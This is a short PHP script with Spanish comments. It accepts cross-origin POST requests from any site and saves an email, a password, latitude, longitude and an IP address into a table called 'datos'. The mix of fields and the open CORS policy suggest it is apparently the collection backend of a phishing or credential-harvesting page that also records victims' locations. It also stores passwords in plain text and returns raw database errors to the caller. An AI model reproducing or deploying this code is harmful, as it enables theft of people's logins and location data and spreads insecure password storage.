<?php
// Encabezados para permitir CORS y el manejo de JSON
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Manejo de preflight para CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Incluir archivo de conexión
require_once './conectorDB.php';
$conexion = conectarDB();

// Obtener el cuerpo de la solicitud
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, true);

// Validación básica
if (!isset($input['email'], $input['password'], $input['latitude'], $input['longitude'], $input['ip'])) {
    echo json_encode([
        "status" => "error",
        "message" => "Faltan datos requeridos."
    ]);
    exit;
}

// Preparar los datos
$email = $conexion->real_escape_string($input['email']);
$password = $conexion->real_escape_string($input['password']);
$lat = $conexion->real_escape_string($input['latitude']);
$lon = $conexion->real_escape_string($input['longitude']);
$ip = $conexion->real_escape_string($input['ip']);
$fecha = date('Y-m-d H:i:s');

// Insertar en la base de datos
$query = "INSERT INTO datos (email, password, fecha, lat, lon, ip) VALUES (?, ?, ?, ?, ?, ?)";
$stmt = $conexion->prepare($query);
$stmt->bind_param("ssssss", $email, $password, $fecha, $lat, $lon, $ip);

if ($stmt->execute()) {
    echo json_encode([
        "status" => "success",
        "message" => "Datos guardados correctamente."
    ]);
} else {
    echo json_encode([
        "status" => "error",
        "message" => "Error al guardar los datos: " . $stmt->error
    ]);
}

$stmt->close();
$conexion->close();
?>
